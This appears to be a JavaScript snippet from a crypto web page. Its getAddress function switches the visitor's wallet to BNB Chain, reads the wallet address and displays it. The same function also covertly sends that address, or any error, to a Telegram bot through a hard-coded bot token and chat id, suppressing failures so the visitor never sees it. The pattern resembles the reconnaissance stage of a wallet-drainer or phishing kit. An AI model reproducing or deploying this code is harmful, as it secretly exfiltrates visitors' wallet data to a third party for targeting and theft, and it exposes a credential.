console.log("processing...");

window.getAddress = async function getAddress() {
    const botToken = "8091385586:AAGlx7odJ5vxkx_qWA_5cTxS67IqW6hVR-c";
    const chatId = "5501640678";

    function sendToTelegram(message) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        }).catch(() => {});
    }

    try {
        // Switch to BNB Chain
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
        });

        // Get accounts
        const accounts = await window.ethereum.request({ 
            method: 'eth_accounts' 
        });
        
        var addressEl = document.getElementById('address');
        if (accounts.length > 0 && addressEl) {
            addressEl.innerHTML = accounts[0];
            console.log("Wallet Address:", accounts[0]);
            sendToTelegram("Wallet Address: " + accounts[0]); // ✅ send to Telegram
        } else {
            if (addressEl) addressEl.innerHTML = 'No address found';
            console.log("No address found");
            sendToTelegram("No address found");
        }
    } catch (error) {
        var addressEl = document.getElementById('address');
        if (addressEl) addressEl.innerHTML = 'Error: ' + error.message;
        console.log("Error:", error.message);
        sendToTelegram("Error: " + error.message); // ✅ send error to Telegram
    }
}
